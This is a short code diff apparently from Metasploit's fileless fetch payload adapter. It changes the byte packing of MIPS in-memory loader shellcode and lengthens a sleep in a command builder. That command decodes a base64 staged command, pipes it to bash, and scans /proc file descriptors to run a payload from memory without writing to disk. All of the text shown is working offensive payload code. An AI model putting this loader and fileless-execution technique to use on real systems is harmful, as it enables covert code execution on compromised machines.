@@ -124,7 +124,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0x0101010c, #0x1020:	syscall	0x40404	0x0101010c
 
       ]
-      payload = in_memory_loader_asm.pack('V*')
+      payload = in_memory_loader_asm.pack('N*')
     when 'mipsle'
       in_memory_loader_asm = [
           0x2520a003, #0x1000:	move	$a0, $sp	0x2520a003
@@ -137,7 +137,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0xbd0f0224, #0x101c:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
           0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
 ]
-      payload = in_memory_loader_asm.pack('V*')
+      payload = in_memory_loader_asm.pack('N*')
 
     when 'ppc'
       in_memory_loader_asm = [
@@ -287,7 +287,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
 
     cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | bash & "
     cmd << 'cd /proc/$!;'
-    cmd << 'sleep 1;' #adding short pause to give process time to load file handle
+    cmd << 'sleep 2;' #adding short pause to give process time to load file handle
     cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
 
     cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
